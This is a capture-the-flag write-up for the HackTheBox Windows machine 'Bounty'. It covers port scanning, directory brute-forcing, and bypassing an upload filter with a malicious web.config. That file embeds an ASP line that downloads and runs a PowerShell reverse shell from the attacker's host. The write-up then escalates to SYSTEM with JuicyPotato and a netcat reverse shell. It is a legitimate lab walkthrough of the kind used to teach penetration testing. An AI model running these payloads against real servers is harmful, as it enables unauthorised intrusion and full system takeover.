---
permalink: /posts/HTB/Bounty
title:  "HTB Bounty"
author: Luc Kolen
description: "Bounty is an easy Windows machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Easy
  - Windows
  - Filter bypass
  - JuicyPotato
---
# 10.10.10.93 - Bounty

- [10.10.10.93 - Bounty](#10101093---bounty)
  - [Open ports](#open-ports)
  - [HTTP](#http)
    - [Gobuster](#gobuster)
    - [File upload](#file-upload)
      - [Bypass](#bypass)
  - [Privilege escalation](#privilege-escalation)
  - [TL;DR](#tldr)

## Open ports

```bash
luc@kali:~/HTB/Bounty$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.93
```

|Port|Service|Version
|---|---|---|
tcp/80|http|Microsoft IIS httpd 7.5

## HTTP

### Gobuster

The page only shows an image and there is no `robots.txt` we we'll run Gobuster and hope to find some pages.

```bash
luc@kali:~/HTB/Bounty$ gobuster dir -u http://10.10.10.93:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -z -k -l -x "txt,html,php,asp,aspx,jsp"
/aspnet_client (Status: 301) [Size: 159]
/transfer.aspx (Status: 200) [Size: 941]
/uploadedfiles (Status: 301) [Size: 159]
```

### File upload

We can upload files on `/transfer.aspx` and those files will probably end up in the `/uploadedfiles` directory.

First we'll generate a shell to upload with MSFvenom.

```bash
luc@kali:~/HTB/Bounty$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=443 -f aspx > shell.aspx
```

![Shell upload](/assets/images/HTB-Bounty/1.a%20Shell%20upload.png)

Trying to upload our shell.aspx results in the message `Invalid File. Please try again`.

#### Bypass

.aspx files aren't allowed, but .config files are allowed. We can abuse this by creating a web.config file that connects back to our machine.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
CreateObject("WScript.Shell").Exec("cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.16:8000/Invoke-PowerShellTcp.ps1')")
%>
```

```bash
luc@kali:~/HTB/Bounty$ cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
luc@kali:~/HTB/Bounty$ echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443' >> Invoke-PowerShellTcp.ps1
luc@kali:~/HTB/Bounty$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.93 - - [12/Jun/2020 16:16:42] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

```bash
luc@kali:~/HTB/Bounty$ sudo nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.93.
Ncat: Connection from 10.10.10.93:49158.
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
bounty\merlin
PS C:\windows\system32\inetsrv> cd \Users\merlin\desktop
PS C:\Users\merlin\desktop> type user.txt
e29ad898************************
```

## Privilege escalation

```bash
PS C:\Users\merlin\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\Users\merlin\desktop> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
System Type:               x64-based PC
```

This machine is vulnerable to JuicyPotato.

```bash
luc@kali:~/HTB/Bounty$ cp /opt/JuicyPotatoBinaries/JuicyPotato.exe .
luc@kali:~/HTB/Bounty$ cp /home/luc/Downloads/netcat-win32-1.12/nc64.exe .
luc@kali:~/HTB/Bounty$ sudo python2 /opt/impacket/examples/smbserver.py share `pwd` -smb2support
```

```bash
PS C:\Users\Merlin\Desktop> net use Z: \\10.10.14.16\share
PS C:\Users\Merlin\Desktop> Z:
PS Z:\> .\JuicyPotato.exe -t * -l 9000 -p nc64.exe -a "-e cmd 10.10.14.16 444"
```

```bash
luc@kali:~/HTB/Bounty$ sudo nc -lnvp 444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::444
Ncat: Listening on 0.0.0.0:444
Ncat: Connection from 10.10.10.93.
Ncat: Connection from 10.10.10.93:49541.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\>whoami
nt authority\system
C:\>cd Users\Administrator\Desktop
C:\Users\Administrator\Desktop>type root.txt
c837f7b6************************
```

## TL;DR

- Bypass upload filter by sending .config file containing VB code
- JuicyPotato
